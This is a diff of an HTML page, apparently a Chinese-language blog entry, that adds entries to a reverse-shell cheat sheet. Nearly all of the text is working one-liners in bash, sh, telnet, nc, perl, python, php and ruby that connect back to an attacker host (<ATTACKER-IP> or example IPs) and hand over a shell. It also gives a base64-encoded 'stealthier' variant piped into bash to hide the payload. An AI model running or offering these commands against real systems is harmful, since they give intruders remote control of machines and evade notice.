@@ -104,10 +104,31 @@ var _hmt = _hmt || [];
   <div class="content">
     <h4>汇总</h4>
 <div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+sh -i &gt;<span class="p">&amp;</span> /dev/udp/127.0.0.1/4242 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#UDP</span>
+
+<span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
+
+<span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
+
+nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'</span>
+
+<span class="c1">#Stealthier method</span>
+<span class="c1">#B64 encode the shell like: echo "nohup bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.4.185/4444 0&gt;&amp;1'" | base64 -w0</span>
+<span class="nb">echo</span> bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK <span class="p">|</span> base64 -d <span class="p">|</span> bash <span class="m">2</span>&gt;/dev/null
+</pre></div>
+<div class="highlight"><pre><span></span>telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
+rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
+telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/bash <span class="p">|</span> telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt;
+rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="m">1</span>&gt;/tmp/bkpipe
 </pre></div>
 <div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<div class="highlight"><pre><span></span><span class="c1">#Linux</span>
+<span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">12345</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<span class="c1">#IPv6</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span> 
 </pre></div>
 <div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </pre></div>
@@ -116,6 +137,10 @@ var _hmt = _hmt || [];
 <div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
 </pre></div>
 <div class="highlight"><pre><span></span>nc -e /bin/sh <span class="m">10</span>.0.0.1 <span class="m">1234</span>
+
+nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
+nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;<span class="p">|</span> /bin/bash <span class="p">|</span> nc &lt;ATTACKER-IP&gt; &lt;PORT2&gt;
+rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="m">1</span>&gt;/tmp/bkpipe
 </pre></div>
 <p>如果nc不支持-e，</p>
 <div class="highlight"><pre><span></span>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc <span class="m">10</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
